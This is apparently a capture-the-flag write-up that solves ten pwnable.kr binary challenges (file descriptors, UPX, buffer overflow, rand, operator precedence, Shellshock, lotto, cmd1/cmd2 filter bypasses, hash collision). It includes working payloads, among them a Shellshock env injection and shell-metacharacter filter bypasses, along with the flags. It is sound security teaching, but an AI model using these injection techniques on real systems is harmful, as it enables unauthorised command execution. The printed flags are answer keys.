# fd [  file descriptor ] 
inside fd.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
i'm using an easy detection technique that says ```if it was a vulnerable C code, recompile it```
<br>
and here is what i got..
```assembly
file.c: In function ‘main’:
file.c:12:8: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  len = read(fd, buf, 32);
        ^~~~
        fread
```
so the key is to understand the read function..
<br>
the very first thing to know about the file descriptor is
```
 file descriptor 0 is the standard input 
 file descriptor 1 is the standard output
 file descriptor 2 is the standard error 
 ```
 more about ```read``` function..
 ```assembly
 NAME
       read - read from a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);
```
so all we have to do here is to change the ```buf``` value to ```LETMEWIN``` by reseting the ```fd``` variable to ```0```
<br>
so we can write to the ```buf``` using the standard input
<br>
on this line ```int fd = atoi( argv[1] ) - 0x1234;``` we can see that the program is converting our input from ```str``` to ```int```
<br>
using ```atoi``` function
```assembly
NAME
       atoi, atol, atoll - convert a string to an integer
```
then minus it from 0x1234 which is ```4660```
<br>
now go ahead and get the flag
 ```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@ubuntu:~$ 
```
```Flag : mommy! I think I know what a file descriptor is!! ```

# flag
UPX packed, unpack it..
```assembly 
┌─[root@parrot]─[~]
└──╼ #strings flag | tail
;dl]tpR
c3Rh
2B)=	
1\a}
_M]h
Upbrk
makBN
su`"]R
UPX!
UPX!
┌─[root@parrot]─[~]
└──╼ #upx -d flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```
using IDA pro..
![screenshot_20180712_180941](https://user-images.githubusercontent.com/22657154/42645760-893ca7ac-8607-11e8-8af8-c2501d4b0742.png)

```Flag : UPX...? sounds like a delivery service :)```

# bof
It was a classic & easy to exploit buffer overflow, nothing to explain 

![buf_at_u](https://user-images.githubusercontent.com/22657154/42649325-15a1da6e-8612-11e8-92ff-2ec8bf0f2d10.png)
![get_flag](https://user-images.githubusercontent.com/22657154/42649329-16da19be-8612-11e8-878a-686fc643550b.png)

```Flag : daddy, I just pwned a buFFer :) ```

# random 
```C
#include <stdio.h>

int main(){
  unsigned int random;
  random = rand();	// random value!

  unsigned int key=0;
  scanf("%d", &key);

  if( (key ^ random) == 0xdeadbeef ){
     printf("Good!\n");
     system("/bin/cat flag");
     return 0;
  }

  printf("Wrong, maybe you should try 2^32 cases.\n");
  return 0;
}
```
the program is generating a random value then do xor using it with our key
<br>
if the result was equal to ```0xdeadbeef``` we will get the flag
<br>
to get the right key we have to xor ```random``` with ```0xdeadbeef```
<br>
```assembly
0x5557cf4ae747      e8c4feffff     call sym.imp.rand       ; int rand(void)
0x5557cf4ae74c b    8945fc         mov dword [local_4h], eax               
```
- NOTE
```
since the rand function has no seed the value will be generated statically to 1804289383
```

so to get the random generated value just set a break point on the instruction after it and see the ```EAX``` value.

![randm](https://user-images.githubusercontent.com/22657154/42652718-ecced984-861b-11e8-879c-80c54a0c8d60.png)

```Flag : Mommy, I thought libc random is unpredictable...```

# mistake
```C
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){

	int fd;
	if(fd=open("password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	} // fd = 0 [STDIN]

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1]; // 10 chrs
	int len;       
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){ // read from STDIN and store input inside pw_buf
		printf("read error\n");
		close(fd);
		return 0;
	}

	char pw_buf2[PW_LEN+1]; // 10 chrs
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ // cmp first input to second input after being xored
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}


```
As the hint suggested, there’s a mistake in operator priority. We know that comparision operator < is given higher priority than assignment operator =. 
<br>
And as we know, that open will return a non-negative integer representing the lowest numbered unused file descriptor, comparision will always fail and return 0. Then 0 is assigned to the fd variable. In addition, from the previous challenges, we know that file descriptor with value 0 is reserved for stdin.
<br>
program will copy the input from stdin to the ````pw_buf```. After that every character from the second input ```pw_buf2``` will be xored with ```1```, and lastly ```pw_buf``` will be compared with ```pw_buf2``` 
<br>
So if we find out combination where first character xored with the 1 will result in the second, we will be able to bypass the password check. I picked 1 and 0.
```assembly
>>> 1 ^ 1
0
```
```assembly
mistake@ubuntu:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
```
![screenshot_20180713_145429](https://user-images.githubusercontent.com/22657154/42693293-5e9a7f5a-86b7-11e8-9bfa-5e3d4e0da3ed.png)

```Flag : Mommy, the operator priority always confuses me :(```

# Shellshock 
What this program does is pretty simple: it sets the values of his real/effective/set_user user and group id to the value of
<br>
his effective group id and then execute a vulnerable version of bash.
<br>
In order to exploit it we need to set an environment variable containing a function and the commands we want to execute:
```READ ABOUT SHELLSHOCK HERE: https://fedoramagazine.org/shellshock-how-does-it-actually-work/```
```assembly
shellshock@ubuntu:~$ export exploit_it="() { :; }; /bin/cat flag;"
shellshock@ubuntu:~$ ./shellshock 
only if I knew CVE-2014-6271 ten years ago..!!
```

``` Flag : only if I knew CVE-2014-6271 ten years ago..!! ```

# Lotto
```C
int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}
```
this code will compare our 6 characters to each character in lotto, so if lotto was equal ```!"#$%&,``` and we enter ```######``` we got the flag.
<br>
but we have to exactly get ```match``` variable value equal  to 6 
<br>
so run the binary using the same input until you got the flag, and as the help menu says
```assembly
- nLotto Rule -
nlotto is consisted with 6 random natural numbers less than 46
...
```
make it less than ```46```

i used pwntools to get the flag.
```python
from pwn import *
proc = process("./lotto")
proc.recv()
while True:
   proc.sendline("1")
   proc.sendline("######")
   a = proc.recv()
   if "mom" in a:
      print(a)
      break
```
![screenshot at 2018-07-13 17-21-32](https://user-images.githubusercontent.com/22657154/42700778-6a396a68-86cd-11e8-89be-513db652bcc9.png)

```Flag : sorry mom... I FORGOT to check duplicate numbers... :( ```
 
# cmd1
```C
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```
The program is filtering out our input from ```flag, sh and tmp```
<br>
and setting the PATH environment variable to a non existing location in the root directory
<br>
to get the flag we have to use the binaries full path like ```/bin/cat``` accompanied with an asterix ```*```
```assembly
cmd1@ubuntu:~$ ./cmd1 "/bin/cat *" | /usr/bin/tail -n 1
mommy now I get what PATH environment is for :)
```

```Flag : mommy now I get what PATH environment is for :)```

# cmd2
```Copied from : https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2.md```
```assembly
In this challenge, we have an updated blacklist of words and symbols. Setting the PATH variable is not an option anymore, because the = character is blacklisted. The most problematic blacklisted character is the forward slash /, because we need that character to execute programs ('./program'), if they are not defined in the PATH variable. This also includes the execution of self-written scripts, where you can execute whatever you want without words being blacklisted. Therefore it is important to somehow insert the / symbol in our command.

There are only a few commands available when the PATH is empty and when you cannot use the forward-slash. One of those commands is pwd. pwd return the absolute path of the current directory. The idea is to cd to the root folder, and execute pwd, which returns /. That is also exactly the character that we need in our command! $(pwd) will insert the result of executing the pwd command in place.

To solve this challenge, we navigate to the root directory and execute our self-constructed command with / replaced with $(pwd). Because we want that the shell executes $(pwd) on the moment that the working directory is set to the root directory, we need to escape the $ symbol to prevent that $(pwd) will be executed before entering ./cmd2
```

```assembly
Payload : ./cmd2 "cd .. ; cd .. ; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)* | \$(pwd)usr\$(pwd)bin\$(pwd)tail -n 1"
```
![screenshot at 2018-07-13 18-38-45](https://user-images.githubusercontent.com/22657154/42703285-d53d00d4-86d4-11e8-87fc-1f3f6681efe9.png)

```Flag : FuN_w1th_5h3ll_v4riabl3s_haha```

# collision

```C
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```
As you can see from the code, the password length needs to be ```20 bytes```, which is equal to ```5``` integers ```(1 int = 4 bytes)```. The sum of the 5 integers from the input needs to be equal to ```0x21DD09EC``` to obtain the flag. Let's find ```5``` integers that are in total equal to ```0x21DD09EC```

```assembly
>>> import struct
>>> import sys
>>> print sys.byteorder # print the endianness format
little
>>> 0x21DD09EC / 5
113626824
>>> hex(0x21DD09EC / 5)
'0x6c5cec8'
>>> 5* struct.pack('<i', 113626824) # '<' means that the bytes need to be in little-endian order, and 'i' means that it needs to be converted to the size of an int.
'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06'
```
after debugging i found that we're missing 4 after calculation so i converted the first```0xe8``` to ```0xcc```
```assembly
[0x55ead5b767e4]> dr rdx
0x21dd09e8
[0x55ead5b767e4]> dr rax
0x21dd09ec
[0x55ead5b767e4]> ? 0xe8 
232 0xe8 0350 232 0000:00e8 232 "\xe8" 0b11101000 232.0 232.000000f 232.000000 0t22121
[0x55ead5b767e4]> ? 0xec
[0x00000000]> ? 0xc8 + 4
204 0xcc 0314 204 0000:00cc 204 "\xcc" 0b11001100 204.0 204.000000f 204.000000 0t21120
```
```assembly
Payload : '\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06'
```
```assembly
col@ubuntu:~$ ./col $( echo -en '\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06' )
daddy! I just managed to create a hash collision :)
```
```Flag : daddy! I just managed to create a hash collision :) ```
